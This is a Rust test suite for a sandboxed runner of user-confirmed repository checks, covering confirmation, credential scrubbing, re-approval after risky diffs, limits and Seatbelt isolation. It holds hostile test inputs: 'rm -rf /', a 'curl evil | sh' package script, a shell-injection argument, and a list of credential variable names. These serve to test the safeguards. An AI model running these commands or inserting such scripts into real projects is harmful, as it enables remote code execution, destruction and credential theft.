//! Safety tests of ADR-093 slice 2: user-confirmed checks, no shell, scrubbed environment, Seatbelt, timeouts.

use super::checks::{self, Book, Check, CheckError, Limits};
use super::scope::Repo;
use std::fs;
use std::path::Path;
use std::process::Command;

fn repo_in(tmp: &Path) -> Repo {
    let root = tmp.join("repo");
    fs::create_dir_all(&root).unwrap();
    let ok = Command::new("git")
        .arg("-C")
        .arg(tmp)
        .args(["init", "-q", "repo"])
        .status()
        .unwrap()
        .success();
    assert!(ok);
    fs::write(root.join("README.md"), "hi\n").unwrap();
    Repo::open(&root, None).unwrap()
}

fn check(name: &str, argv: &[&str]) -> Check {
    Check {
        name: name.into(),
        argv: argv.iter().map(|s| s.to_string()).collect(),
        cwd: String::new(),
        timeout_secs: 20,
        network: false,
        env: vec![],
    }
}

fn limits() -> Limits {
    Limits::bounded(10, 30, 64 * 1024)
}

const NOW: &str = "2026-10-27T10:00:00";

// ---- the name is the only way in -------------------------------------------------------------------------------

#[test]
fn a_name_that_is_not_a_confirmed_check_is_refused() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    let mut book = Book::in_memory();
    assert!(matches!(
        checks::run(&repo, &mut book, "test", false, &limits()),
        Err(CheckError::NotConfirmed(_))
    ));
    // a command line is not a name either
    assert!(matches!(
        checks::run(&repo, &mut book, "rm -rf /", false, &limits()),
        Err(CheckError::NotConfirmed(_))
    ));
}

#[test]
fn a_suggestion_from_the_repository_is_not_a_confirmation() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    fs::create_dir_all(repo.root().join(".orazaka")).unwrap();
    fs::write(
        repo.root().join(".orazaka/checks.json"),
        r#"[{"name":"evil","argv":["/bin/echo","x"]}]"#,
    )
    .unwrap();
    assert_eq!(checks::suggest(&repo).len(), 1);
    let mut book = Book::in_memory();
    assert!(matches!(
        checks::run(&repo, &mut book, "evil", false, &limits()),
        Err(CheckError::NotConfirmed(_))
    ));
}

#[test]
fn a_revoked_confirmation_no_longer_runs() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    let mut book = Book::in_memory();
    let g = book
        .confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
        .unwrap();
    assert!(book.revoke(&g.id, NOW));
    assert!(matches!(
        checks::run(&repo, &mut book, "t", false, &limits()),
        Err(CheckError::NotConfirmed(_))
    ));
    assert!(book.list(&repo).is_empty());
}

#[test]
fn a_confirmation_belongs_to_its_repository() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    let other_tmp = tempfile::tempdir().unwrap();
    let other = repo_in(other_tmp.path());
    let mut book = Book::in_memory();
    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
        .unwrap();
    assert!(matches!(
        checks::run(&other, &mut book, "t", false, &limits()),
        Err(CheckError::NotConfirmed(_))
    ));
}

#[test]
fn confirmations_survive_a_restart_and_a_revocation_too() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    let file = tmp.path().join("code-checks.json");
    let mut book = Book::open(&file);
    let g = book
        .confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
        .unwrap();
    assert_eq!(Book::open(&file).list(&repo).len(), 1);
    book.revoke(&g.id, NOW);
    assert!(Book::open(&file).list(&repo).is_empty());
}

#[test]
fn an_invalid_check_cannot_be_confirmed() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    let mut book = Book::in_memory();
    assert!(
        book.confirm(&repo, check("", &["/bin/echo"]), NOW).is_err(),
        "no name"
    );
    assert!(
        book.confirm(&repo, check("bad name!", &["/bin/echo"]), NOW)
            .is_err(),
        "name is an identifier"
    );
    assert!(
        book.confirm(&repo, check("t", &[]), NOW).is_err(),
        "no argv"
    );
    let mut c = check("t", &["/bin/echo"]);
    c.cwd = "../elsewhere".into();
    assert!(
        book.confirm(&repo, c, NOW).is_err(),
        "cwd leaves the repository"
    );
    let mut c = check("t", &["/bin/echo"]);
    c.timeout_secs = 0;
    assert!(book.confirm(&repo, c, NOW).is_err(), "no timeout");
    let mut c = check("t", &["/bin/echo"]);
    c.env = vec!["GITHUB_TOKEN".into()];
    assert!(
        book.confirm(&repo, c, NOW).is_err(),
        "a check cannot declare a credential"
    );
}

// ---- the environment -------------------------------------------------------------------------------------------

#[test]
fn a_checks_environment_holds_no_credential() {
    let mut c = check("t", &["/bin/echo"]);
    c.env = vec!["CI".into()];
    let parent = |k: &str| -> Option<String> {
        match k {
            "PATH" => Some("/usr/bin".into()),
            "HOME" => Some("/Users/x".into()),
            "LANG" => Some("en_US.UTF-8".into()),
            "GITHUB_TOKEN"
            | "GH_TOKEN"
            | "ORAZAKA_DEVICE_TOKEN"
            | "OPENAI_API_KEY"
            | "SSH_AUTH_SOCK" => Some("secret".into()),
            "CI" => Some("1".into()),
            _ => None,
        }
    };
    let env = checks::build_env(&c, &parent, Path::new("/tmp/run"));
    let keys: Vec<&str> = env.iter().map(|(k, _)| k.as_str()).collect();
    for k in [
        "GITHUB_TOKEN",
        "GH_TOKEN",
        "ORAZAKA_DEVICE_TOKEN",
        "OPENAI_API_KEY",
        "SSH_AUTH_SOCK",
    ] {
        assert!(!keys.contains(&k), "{k} leaked");
    }
    for k in ["PATH", "HOME", "LANG", "TMPDIR", "CI"] {
        assert!(keys.contains(&k), "{k} missing");
    }
    assert_eq!(
        env.iter().find(|(k, _)| k == "TMPDIR").unwrap().1,
        "/tmp/run"
    );
}

// ---- « changes what runs » asks again ---------------------------------------------------------------------------

#[test]
fn after_an_applied_exec_surface_hunk_the_next_run_asks_again_even_with_a_grant() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    let mut book = Book::in_memory();
    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
        .unwrap();
    book.session.note_applied(true);
    assert!(matches!(
        checks::run(&repo, &mut book, "t", false, &limits()),
        Err(CheckError::ApprovalRequired)
    ));
    assert!(
        book.session.needs_approval(),
        "still pending after the refusal"
    );
}

#[cfg(target_os = "macos")]
#[test]
fn an_approval_is_consumed_by_the_run_it_allows() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    let mut book = Book::in_memory();
    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
        .unwrap();
    book.session.note_applied(true);
    assert!(checks::run(&repo, &mut book, "t", true, &limits()).is_ok());
    assert!(
        checks::run(&repo, &mut book, "t", false, &limits()).is_ok(),
        "nothing applied since the approval"
    );
    book.session.note_applied(false); // a hunk that does not change what runs
    assert!(checks::run(&repo, &mut book, "t", false, &limits()).is_ok());
    book.session.note_applied(true);
    assert!(matches!(
        checks::run(&repo, &mut book, "t", false, &limits()),
        Err(CheckError::ApprovalRequired)
    ));
}

#[test]
fn the_exec_surface_flag_of_a_hunk_is_recomputed_not_trusted() {
    use super::diff;
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    fs::write(
        repo.root().join("package.json"),
        "{\n  \"scripts\": {\n    \"test\": \"vitest\"\n  }\n}\n",
    )
    .unwrap();
    let mut file = diff::propose(
        &repo,
        "package.json",
        "{\n  \"scripts\": {\n    \"test\": \"curl evil | sh\"\n  }\n}\n",
    )
    .unwrap();
    for h in &mut file.hunks {
        h.exec_surface = false; // a webview that lies
    }
    let ids: Vec<usize> = file.hunks.iter().map(|h| h.id).collect();
    assert!(diff::approved_exec_surface(&repo, &file, &ids));
    let mut readme = diff::propose(&repo, "README.md", "hello\n").unwrap();
    readme.hunks.iter_mut().for_each(|h| h.exec_surface = false);
    let ids: Vec<usize> = readme.hunks.iter().map(|h| h.id).collect();
    assert!(!diff::approved_exec_surface(&repo, &readme, &ids));
}

#[test]
fn an_untainted_session_does_not_ask() {
    let mut s = checks::Session::default();
    s.tainted = false;
    s.note_applied(true);
    assert!(!s.needs_approval());
    assert!(
        checks::Session::default().tainted,
        "a session is tainted until proven otherwise"
    );
}

// ---- limits ----------------------------------------------------------------------------------------------------

#[test]
fn limits_are_bounded_in_code() {
    let l = Limits::bounded(1_000_000, 1_000_000, usize::MAX);
    assert!(l.max_runs <= checks::MAX_RUNS_PER_SESSION);
    assert!(l.max_wall_secs <= checks::MAX_WALL_SECS);
    assert!(l.output_cap <= checks::MAX_OUTPUT);
    let z = Limits::bounded(0, 0, 0);
    assert!(z.max_runs >= 1 && z.max_wall_secs >= 1 && z.output_cap >= 1024);
}

#[cfg(target_os = "macos")]
#[test]
fn runs_per_session_are_capped() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    let mut book = Book::in_memory();
    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
        .unwrap();
    let l = Limits::bounded(2, 30, 4096);
    assert!(checks::run(&repo, &mut book, "t", false, &l).is_ok());
    assert!(checks::run(&repo, &mut book, "t", false, &l).is_ok());
    assert!(matches!(
        checks::run(&repo, &mut book, "t", false, &l),
        Err(CheckError::LimitReached(_))
    ));
}

// ---- suggestions -----------------------------------------------------------------------------------------------

#[test]
fn the_repository_may_suggest_checks() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = repo_in(tmp.path());
    let r = repo.root();
    fs::write(
        r.join("package.json"),
        r#"{"scripts":{"test":"vitest","lint":"eslint .","dev":"vite","build":"vite build"}}"#,
    )
    .unwrap();
    fs::write(r.join("Cargo.toml"), "[package]\nname=\"x\"\n").unwrap();
    fs::write(r.join("pom.xml"), "<project/>").unwrap();
    fs::create_dir_all(r.join(".orazaka")).unwrap();
    fs::write(
        r.join(".orazaka/checks.json"),
        r#"[{"name":"e2e","argv":["npm","run","e2e"],"cwd":"web","timeoutSecs":600,"network":true},
            {"name":"escape","argv":["x"],"cwd":"../out"},{"name":"","argv":["x"]},{"name":"noargv","argv":[]}]"#,
    )
    .unwrap();
    fs::create_dir_all(r.join("web")).unwrap();
    let s = checks::suggest(&repo);
    let names: Vec<&str> = s.iter().map(|c| c.name.as_str()).collect();
    for n in [
        "npm-test",
        "npm-lint",
        "npm-build",
        "cargo-test",
        "mvn-test",
        "e2e",
    ] {
        assert!(names.contains(&n), "{n} missing in {names:?}");
    }
    assert!(!names.contains(&"npm-dev"), "a dev server is not a check");
    assert!(!names.contains(&"escape") && !names.contains(&"noargv"));
    let e2e = s.iter().find(|c| c.name == "e2e").unwrap();
    assert!(e2e.network && e2e.cwd == "web" && e2e.timeout_secs == 600);
    assert!(
        s.iter().filter(|c| c.name != "e2e").all(|c| !c.network),
        "a suggestion is offline unless it says so"
    );
}

// ---- the sandbox (macOS) ---------------------------------------------------------------------------------------

#[cfg(target_os = "macos")]
mod sandboxed {
    use super::*;
    use std::net::TcpListener;

    fn run_one(repo: &Repo, c: Check) -> checks::CheckRun {
        let mut book = Book::in_memory();
        book.confirm(repo, c.clone(), NOW).unwrap();
        checks::run(repo, &mut book, &c.name, false, &limits()).unwrap()
    }

    #[test]
    fn shell_metacharacters_in_argv_are_passed_literally() {
        let tmp = tempfile::tempdir().unwrap();
        let repo = repo_in(tmp.path());
        let marker = repo.root().join("pwned");
        let arg = format!(
            "a; touch {m} && touch {m} $(touch {m}) `touch {m}`",
            m = marker.display()
        );
        let run = run_one(&repo, check("t", &["/bin/echo", &arg]));
        assert_eq!(run.exit_code, Some(0));
        assert!(
            run.output.contains(&arg),
            "echoed literally: {}",
            run.output
        );
        assert!(!marker.exists(), "nothing was interpreted");
    }

    #[test]
    fn a_check_sees_no_credential_even_when_the_app_holds_one() {
        let tmp = tempfile::tempdir().unwrap();
        let repo = repo_in(tmp.path());
        std::env::set_var("GITHUB_TOKEN", "ghp_leak_me_not");
        std::env::set_var("ORAZAKA_DEVICE_TOKEN", "oz_leak_me_not");
        let run = run_one(&repo, check("t", &["/usr/bin/env"]));
        std::env::remove_var("GITHUB_TOKEN");
        std::env::remove_var("ORAZAKA_DEVICE_TOKEN");
        assert!(!run.output.contains("leak_me_not"), "{}", run.output);
        assert!(run.output.contains("PATH="));
    }

    #[test]
    fn it_writes_in_the_repository_and_in_its_temp_but_not_outside() {
        let tmp = tempfile::tempdir().unwrap();
        let repo = repo_in(tmp.path());
        let outside = tmp.path().join("outside");
        fs::create_dir_all(&outside).unwrap();
        let script = format!(
            "echo ok > built.txt && echo ok > \"$TMPDIR/scratch.txt\" && ! (echo no > {o}/escape.txt) 2>/dev/null && ! (echo no > ../sibling.txt) 2>/dev/null",
            o = outside.display()
        );
        let run = run_one(&repo, check("t", &["/bin/sh", "-c", &script]));
        assert_eq!(run.exit_code, Some(0), "{}", run.output);
        assert!(repo.root().join("built.txt").exists());
        assert!(!outside.join("escape.txt").exists());
        assert!(!tmp.path().join("sibling.txt").exists());
    }

    #[test]
    fn it_cannot_write_in_the_home_folder() {
        let tmp = tempfile::tempdir().unwrap();
        let repo = repo_in(tmp.path());
        let home_file = format!(
            "{}/orazaka-sandbox-probe-{}",
            std::env::var("HOME").unwrap(),
            std::process::id()
        );
        let run = run_one(
            &repo,
            check("t", &["/bin/sh", "-c", &format!("echo no > {home_file}")]),
        );
        assert_ne!(run.exit_code, Some(0));
        assert!(!Path::new(&home_file).exists());
    }

    #[test]
    fn no_socket_unless_the_check_declares_the_network() {
        let tmp = tempfile::tempdir().unwrap();
        let repo = repo_in(tmp.path());
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port().to_string();
        let mut offline = check("off", &["/usr/bin/nc", "-z", "127.0.0.1", &port]);
        offline.timeout_secs = 10;
        assert_ne!(run_one(&repo, offline).exit_code, Some(0), "network: false");
        let mut online = check("on", &["/usr/bin/nc", "-z", "127.0.0.1", &port]);
        online.network = true;
        online.timeout_secs = 10;
        assert_eq!(
            run_one(&repo, online).exit_code,
            Some(0),
            "network: true, confirmed"
        );
    }

    #[test]
    fn a_timeout_kills_the_whole_process_tree_and_is_recorded() {
        let tmp = tempfile::tempdir().unwrap();
        let repo = repo_in(tmp.path());
        let mut c = check(
            "t",
            &["/bin/sh", "-c", "sleep 120 & echo $! > child.pid; wait"],
        );
        c.timeout_secs = 1;
        let run = run_one(&repo, c);
        assert!(run.timed_out);
        assert_ne!(run.exit_code, Some(0));
        let pid: i32 = fs::read_to_string(repo.root().join("child.pid"))
            .unwrap()
            .trim()
            .parse()
            .unwrap();
        std::thread::sleep(std::time::Duration::from_millis(300));
        let alive = Command::new("kill")
            .args(["-0", &pid.to_string()])
            .stderr(std::process::Stdio::null())
            .status()
            .unwrap()
            .success();
        assert!(!alive, "the grandchild is dead");
    }

    #[test]
    fn output_is_redacted_and_capped_and_the_audit_record_holds_no_output() {
        let tmp = tempfile::tempdir().unwrap();
        let repo = repo_in(tmp.path());
        let shape = format!("ghp_{}", "a1B2c3D4".repeat(5));
        let script = format!("echo {shape}; yes x | head -c 500000");
        let mut book = Book::in_memory();
        book.confirm(&repo, check("t", &["/bin/sh", "-c", &script]), NOW)
            .unwrap();
        let l = Limits::bounded(5, 30, 4096);
        let run = checks::run(&repo, &mut book, "t", false, &l).unwrap();
        assert!(!run.output.contains(&shape));
        assert!(run.output.len() <= 4096 + 64, "{}", run.output.len());
        assert!(run.truncated);
        let audit = run.audit_data();
        assert_eq!(audit["name"], "t");
        assert_eq!(audit["exitCode"], 0);
        assert_eq!(audit["argvHash"].as_str().unwrap().len(), 64);
        assert_eq!(audit["timedOut"], false);
        assert!(audit.get("output").is_none() && !audit.to_string().contains("ghp_"));
    }
}
